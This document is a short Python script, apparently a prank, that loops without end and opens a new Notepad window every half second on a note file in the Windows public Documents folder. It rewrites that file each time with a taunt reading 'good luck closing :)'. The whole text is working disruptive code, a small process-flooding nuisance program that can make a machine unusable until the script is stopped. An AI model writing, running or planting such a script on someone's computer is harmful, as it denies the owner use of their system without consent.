import subprocess
import time

while True:
    subprocess.Popen(["notepad.exe", "C:\\Users\\Public\\Documents\\skullcrusherzz_note.txt"], shell=True)
    with open("C:\\Users\\Public\\Documents\\skullcrusherzz_note.txt", 'w') as file:
        file.write("made by skullcrusherzz., good luck closing :)")
    time.sleep(0.5)